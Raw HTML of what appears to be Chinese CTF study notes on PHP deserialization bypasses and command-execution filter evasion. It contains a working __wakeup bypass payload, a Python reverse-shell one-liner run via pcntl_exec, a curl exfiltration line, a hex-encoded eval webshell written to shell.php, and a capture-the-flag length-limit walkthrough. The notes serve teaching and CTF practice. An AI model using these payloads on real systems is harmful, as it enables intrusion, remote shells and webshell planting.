href="#绕过字符过滤" class="headerlink" title="绕过字符过滤"></a>绕过字符过滤</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>序列字符串中<strong>表示字符类型的s大写时，会被当成16进制解析。</strong></p></blockquote><h3 id="绕过wake-up"><a href="#绕过wake-up" class="headerlink" title="绕过wake_up"></a>绕过wake_up</h3><ul><li><strong>php版本 PHP5&lt;5.6.25，PHP7 &lt; 7.0.10</strong></li></ul><p><strong>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup( )</code>的执行。</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span>= <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//绕过preg_match()</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:3:&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//绕过__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>引用变量</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014.png" alt="image-20221026153815014"></p><blockquote><p>在php里&amp;相当于两个变量都指向同一个地址，修改一个会影响到另一个。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP命令执行</title>
      <link href="/2023/05/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/05/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认无回显</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()和反引号</span><br><span class="line"><span class="title function_ invoke__">popen</span>()，<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认有回显</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span> ( 命令，结果数组 ，状态码 )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>,<span class="variable">$output</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># 默认无回显，要想获得结果，就要输出第二个参数</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># 命令执行成功的状态码为0</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$return_var</span>);</span><br></pre></td></tr></table></figure><h3 id="system"><a href="#system" class="headerlink" title="system()"></a><strong>system()</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span> ( 命令, 状态码 )</span><br></pre></td></tr></table></figure><p>实际上是执行了<code>sh -c &quot;command&quot;</code>命令</p><p><strong>system()函数</strong>执行有回显，将执行结果输出到页面上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void passthru ( 命令, 状态码  )</span><br></pre></td></tr></table></figure><p>和<strong>system函数</strong>类似，执行有回显，将执行结果输出到页面上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="shell-exec-和-反引号"><a href="#shell-exec-和-反引号" class="headerlink" title="shell_exec()和 反引号"></a><strong>shell_exec()和 反引号</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>( 命令 )</span><br></pre></td></tr></table></figure><p><strong>shell_exec()函数</strong>默认无回显，通过 <strong>echo</strong> 可将执行结果输出到页面</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec() 函数实际上仅是反撇号 () 操作符的变体，当禁用shell_exec时，&#96; 也不可执行</strong></p><p>反引号在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    `whoami`;</span><br><span class="line">    <span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure><p>函数需要两个参数，一个是执行的命令**<code>command</code><strong>，另外一个是指针文件的连接模式</strong><code>mode</code>**，有<code>r</code>和<code>w</code>代表读和写。</p><p>函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls -l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;popen() failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><p>与<code>popen()</code>类似，只是可以开两个管道。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入 </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容 </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误 </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容 stream_get_contents — 读取资源流到一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h3><p>前提条件：<strong>PHP安装并启用了pcntl插件</strong></p><p>pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。</p><p>pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。</p><p>利用pcntl_exec()执行test.sh：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line">   <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;/tmp/test.sh&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;pcntl extension is not support!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;ip&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="判断操作系统类型"><a href="#判断操作系统类型" class="headerlink" title="判断操作系统类型"></a>判断操作系统类型</h2><h3 id="无回显情况"><a href="#无回显情况" class="headerlink" title="无回显情况"></a>无回显情况</h3><ul><li><p>路径大小写敏感？</p></li><li><p>nmap</p></li><li><p>外带命令执行结果</p></li><li><p>通过<code>ping</code>命令</p><blockquote><p>Windows下的Ping命令每间隔一秒会发送一个ICMP ECHO_REQUEST 包，因此可以利用 Ping 命令来近似地模拟等待指定秒数的效果</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -n 2 127.0.0.1</span><br><span class="line">ping -n 3 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230519171132332.png" alt="image-20230519171132332"></p><p><img src="/../images/image-20230519171119146.png" alt="image-20230519171119146"></p></li></ul><h2 id="无回显姿势"><a href="#无回显姿势" class="headerlink" title="无回显姿势"></a>无回显姿势</h2><ul><li><p>判断是否执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">报错</span><br><span class="line">延时</span><br></pre></td></tr></table></figure></li><li><p>反弹shell</p><p>在线生成：<a href="https://zgao.top/tools/reverse/">https://zgao.top/tools/reverse/</a></p></li><li><p>外带</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl ip:port\`cmd`</span><br><span class="line">dnslog</span><br></pre></td></tr></table></figure><p>不出网+DNS请求出网</p><p><a href="https://github.com/A0WaQ4/HexDnsEchoT">https://github.com/A0WaQ4/HexDnsEchoT</a></p></li><li><p>将文件移动到可访问目录（网站目录，静态 文件目录）</p><ul><li><p>读取内容重定向写入文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag &gt;1</span><br></pre></td></tr></table></figure></li><li><p>复制</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /f* .</span><br></pre></td></tr></table></figure></li><li><p>创建链接文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /f* 1</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="写🐎"><a href="#写🐎" class="headerlink" title="写🐎"></a>写🐎</h3><h4 id="确定网站路径"><a href="#确定网站路径" class="headerlink" title="确定网站路径"></a>确定网站路径</h4><ul><li><p>Windows</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /x /s /b yokan_test.js</span><br><span class="line">for /r c:\ %i in (yokan_test.js*) do @echo %i</span><br><span class="line">dir /s/a-d/b yokan_test.js</span><br></pre></td></tr></table></figure></li><li><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -type f -name 1.js|while read f;do sh -c &#x27;id;pwd;hostname;/sbin/ifconfig&#x27; &gt;$(dirname $f)/test.txt;done</span><br><span class="line"></span><br><span class="line">locate /js/1.js|while read f;do sh -c &#x27;id;pwd;ifconfig&#x27;&gt;$(dirname $f)/test1.txt;done</span><br></pre></td></tr></table></figure></li></ul><h4 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h4><ul><li><p>远程下载</p><p><a href="https://paper.seebug.org/834/#windows">红队后渗透测试中的文件传输技巧</a></p></li><li><p>重定向写入</p><blockquote><p><strong>webshell特殊符号问题，可以先做base64编码写入，然后再解码</strong></p></blockquote></li></ul><h4 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h4><p>重定向写入</p><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="多条命令执行"><a href="#多条命令执行" class="headerlink" title="多条命令执行"></a>多条命令执行</h4><table><thead><tr><th align="center"></th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">|</td><td align="center">管道，前一个命令的输出作为后一个命令的输入</td></tr><tr><td align="center">；</td><td align="center">依次执行命令</td></tr><tr><td align="center">||</td><td align="center">如果前一条命令执行不成功则执行下一条命令</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">如果前一条命令执行成功则执行下一条命令</td></tr><tr><td align="center">%0a  &#x2F; %0d%0a</td><td align="center">换行执行命令</td></tr><tr><td align="center">&#96;&#96;</td><td align="center">内敛执行</td></tr><tr><td align="center">$()</td><td align="center">内敛执行</td></tr></tbody></table><h4 id=""><a href="#" class="headerlink" title="."></a>.</h4><p>Linux 中，<code>.</code>也叫<code>period</code>，它的作用和<code>source</code>一样，就是用当前的 shell 执行一个文件中的命令。比如，当前运行的 shell 是 bash，则 <code>. filename</code>的意思就是用 bash 执行 filename 文件中的命令。</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><ul><li>base64</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;base64(payload)&#x27; | base64 -d | bash</span><br></pre></td></tr></table></figure><ul><li><p>进制绕过</p><p>shell解析八进制，<code>ls</code> → <code>$&#39;\154&#39;$&#39;\163&#39;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ $&#x27;\154&#x27;$&#x27;\163&#x27;</span><br><span class="line">1                           jdk-8u333-linux-x64.tar.gz:Zone.Identifier  result.txt     ysoserial.jar:Zone.Identifier</span><br><span class="line">jdk-8u333-linux-x64.tar.gz  jdk8</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php传参时的格式</span></span><br><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>)</span><br><span class="line">$(<span class="keyword">echo</span> <span class="string">&quot;\154\163&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>进制转换</li></ul> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ echo $((2#111))</span><br><span class="line">7</span><br></pre></td></tr></table></figure></li></ul><h4 id="php绕过"><a href="#php绕过" class="headerlink" title="php绕过"></a>php绕过</h4><p>php花样就多了😋</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &#x27;system(chr(108).chr(115))&#x27;</span><br></pre></td></tr></table></figure><h4 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h4><ol><li><p>插入\</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat = ca\t = c\at = \cat</span><br></pre></td></tr></table></figure></li><li><p>插入空字符</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls = l&#x27;&#x27;s = l&quot;&quot;s = l&#x27;s&#x27; = l&quot;s&quot; （只要插入成对的单双引号就可以）</span><br><span class="line">= l$1s = l$&#123;asdfa&#125;s = l``s =  l$(``)s  =  l$(&#x27;&#x27;)s = l$(&quot;&quot;)s</span><br></pre></td></tr></table></figure><blockquote><p>$1~$9为脚本参数</p><p>${xx}代表变量值,只要xx没有定义即可</p><p>内敛执行空命令</p></blockquote></li><li><p>变量拼接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=c;b=at;$a$b file</span><br></pre></td></tr></table></figure><blockquote><p>如果；被过滤，可以用%0a或者&amp;&amp;（需要url编码）代替</p></blockquote></li><li><p>其他命令代替</p></li><li><p>文件名用通配符</p></li></ol><h4 id="输出重定向符绕过"><a href="#输出重定向符绕过" class="headerlink" title="输出重定向符绕过"></a>输出重定向符绕过</h4><p>重定向符写入文件的本质是将<strong>标准输入输出到文件</strong>中</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 3c3f70687020406576616c28245f504f53545b277479736563275d293b3f3e|xxd -ps -r|tee shell.php</span><br></pre></td></tr></table></figure><blockquote><p>xxd：用于将十六进制编码的数据转换回原始的二进制数据</p><ul><li><code>-ps</code>：指定输出格式为纯粹的十六进制字符串。</li><li><code>-r</code>：表示进行反向操作，即将十六进制字符串转换为二进制数据。</li></ul><p>tee：同时将读取的标准输入内容输出到标准输出和指定的文件中。</p></blockquote><p>顺着这个思路</p><p><img src="/../images/image-20230912231430079.png" alt="image-20230912231430079"></p><p><img src="/../images/image-20230912231439162.png" alt="image-20230912231439162"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command | dd of=file.txt</span><br><span class="line">command | cp /dev/stdin file.txt</span><br></pre></td></tr></table></figure><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><ol><li><code>$&#123;IFS&#125;</code></li><li><code>$IFS</code>+空字符</li><li>重定向符</li><li><code>&#123;cat,flag.php&#125;</code></li><li>url参数编码，空格%20，制表符%09</li></ol><h4 id="目录分隔符-绕过"><a href="#目录分隔符-绕过" class="headerlink" title="目录分隔符/绕过"></a>目录分隔符<code>/</code>绕过</h4><ol><li><p>多条命令执行，先cd到目的目录，再执行cat等命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cat flag</span><br></pre></td></tr></table></figure><blockquote><p>如果；被过滤，可以用%0a或者&amp;&amp;（需要url编码）代替</p></blockquote></li><li><p>截取环境变量</p><p><code>env</code>或者<code>printenv</code>：打印环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ echo $&#123;PWD:0:1&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure></li></ol><h4 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat `ls`</span><br><span class="line">cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;读取当前目录的所有文件</span></span><br><span class="line">将ls的输出作为cat的输入进行执行。</span><br></pre></td></tr></table></figure><h4 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h4><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><ol><li><p>ls输出的结果是按照字典排序的</p><p><img src="/../images/image-20221017101847464.png" alt="image-20221017101847464"></p></li><li><p>\放在指令的最末端，表示指令连接下一行。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat \</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1</span></span><br><span class="line">da</span><br></pre></td></tr></table></figure></li><li><p><code>ls -t &gt; a</code>将文件名（命令）按时间重定向到脚本文件a中，<code>sh a</code>执行脚本a。</p><p>注：将执行的命令反序生成。<code>\\</code>是为了转义，让文件名带上\</p><img src="../images/1650186228_625bd7f4927774ad69919.png!small" alt="img" style="zoom:150%;" /></li><li><p>单独一个<code>*</code>会将目录下的文件名按照字典排序拼接成命令执行，第一个文件名为命令，其他为该命令的参数</p><p><code>echo hello</code></p><p><img src="/../images/image-20221017102117317.png" alt="image-20221017102117317"></p><p>在这个基础上<code>*o</code>也可以，就是取出满足正则*o的文件名拼接成命令执行。</p><p><img src="/../images/image-20221017102322441.png" alt="image-20221017102322441"></p></li></ol><h5 id="UUCTF-2022-新生赛-ezrce"><a href="#UUCTF-2022-新生赛-ezrce" class="headerlink" title="[UUCTF 2022 新生赛]ezrce"></a>[UUCTF 2022 新生赛]ezrce</h5><p>给出了一个命令执行接口，测试之后发现长度限制为6,正常思路</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112107946.png" alt="image-20221107112107946"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112233686.png" alt="image-20221107112233686"></p><p>然后尝试访问&#x2F;tmp&#x2F;a，服务器没有报错，说明<code>&gt;a</code>其实是执行成功了的。</p><ul><li><p>解法1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span></span></span><br><span class="line">* /* .</span><br></pre></td></tr></table></figure><p>第一条命令创建一个文件名为cp的文件</p><p>第二条命令执行<code>cp /* .</code>，将根目录下的文件复制到当前目录下，然后访问&#x2F;tmp&#x2F;flag即可</p><p><img src="/../images/image-20221107113239425.png" alt="image-20221107113239425"></p></li><li><p>解法2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">nl</span></span></span><br><span class="line">* /*&gt;a</span><br></pre></td></tr></table></figure><p>第一条命令创建一个文件名为nl的文件</p><p>第二条命令执行<code>nl /*&gt;a</code>，读取根目录下所有文件的内容重定向到a中，然后访问&#x2F;tmp&#x2F;a即可</p><p><img src="/../images/image-20221107113608245.png" alt="image-20221107113608245"></p></li><li><p>解法3</p><p>脚本直接写🐎</p></li></ul><h4 id="无数字绕过"><a href="#无数字绕过" class="headerlink" title="无数字绕过"></a>无数字绕过</h4><p>安洵杯2020[Web-Bash-Vino0o0o]</p><figure class="highlight php"><table><tr><td class="code"><pre><span 